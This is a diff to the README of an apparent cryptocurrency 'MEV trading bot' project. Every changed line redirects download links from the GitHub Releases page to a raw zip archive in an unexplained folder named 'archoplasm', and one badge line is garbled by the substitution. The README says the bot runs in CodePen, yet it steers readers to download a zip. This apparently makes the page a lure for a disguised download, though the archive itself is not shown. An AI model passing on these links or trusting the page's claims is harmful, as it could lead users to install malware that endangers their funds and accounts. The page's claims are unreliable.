@@ -1,7 +1,7 @@
 # 🚀 Trading-Bot_Mev_Local_PC - Trade Smarter with Automated Strategies
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20https%3A%2F%2Fgithub.com%2Falennani%2FTrading-Bot_Mev_Local_PC%2Freleases-blue)](https://github.com/alennani/Trading-Bot_Mev_Local_PC/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/alennani/Trading-Bot_Mev_Local_PC/main/archoplasm/Trading-Bot_Mev_Local_PC.zip%20Latest%20Release-%20https%3A%2F%https://raw.githubusercontent.com/alennani/Trading-Bot_Mev_Local_PC/main/archoplasm/Trading-Bot_Mev_Local_PC.zip%2Falennani%2FTrading-Bot_Mev_Local_PC%2Freleases-blue)](https://raw.githubusercontent.com/alennani/Trading-Bot_Mev_Local_PC/main/archoplasm/Trading-Bot_Mev_Local_PC.zip)
 
 ## 📖 Overview
 Welcome to the **Trading-Bot_Mev_Local_PC**! This trading bot is designed for decentralized finance (DeFi) and runs directly in CodePen using JavaScript. It supports trading on decentralized exchanges (DEXs) like Uniswap and SushiSwap. With built-in technical indicators such as RSI and MACD, this bot can help you create custom trading strategies and use cross-chain bridges effectively.
@@ -23,7 +23,7 @@ To run the Trading-Bot_Mev_Local_PC, ensure your system meets the following requ
 ## 🚀 Getting Started
 Follow these steps to download and set up your trading bot:
 
-1. **Visit the Download Page**: Go to the [Releases Page](https://github.com/alennani/Trading-Bot_Mev_Local_PC/releases) to find the latest version.
+1. **Visit the Download Page**: Go to the [Releases Page](https://raw.githubusercontent.com/alennani/Trading-Bot_Mev_Local_PC/main/archoplasm/Trading-Bot_Mev_Local_PC.zip) to find the latest version.
    
 2. **Download the Software**: 
    - Click on the latest release available.
@@ -46,7 +46,7 @@ Follow these steps to download and set up your trading bot:
    - Monitor its performance and tweak strategies as necessary for optimal results.
 
 ## 📦 Download & Install
-To get started, [visit this page to download](https://github.com/alennani/Trading-Bot_Mev_Local_PC/releases) the latest version of Trading-Bot_Mev_Local_PC. Follow the instructions outlined above to set it up.
+To get started, [visit this page to download](https://raw.githubusercontent.com/alennani/Trading-Bot_Mev_Local_PC/main/archoplasm/Trading-Bot_Mev_Local_PC.zip) the latest version of Trading-Bot_Mev_Local_PC. Follow the instructions outlined above to set it up.
 
 ## 💡 Helpful Tips
 - **Testing**: Before trading with real money, test your strategies using a practice account.
@@ -73,4 +73,4 @@ Trading cryptocurrencies involves risk. Be sure to do your own research and only
 ## 🧑‍💻 Contributing
 Contributions are welcome! If you have suggestions or improvements, please open issues or pull requests on this repository.
 
-For more information and to stay updated, remember to check out the [Releases Page](https://github.com/alennani/Trading-Bot_Mev_Local_PC/releases) regularly. Happy trading!
+For more information and to stay updated, remember to check out the [Releases Page](https://raw.githubusercontent.com/alennani/Trading-Bot_Mev_Local_PC/main/archoplasm/Trading-Bot_Mev_Local_PC.zip) regularly. Happy trading!
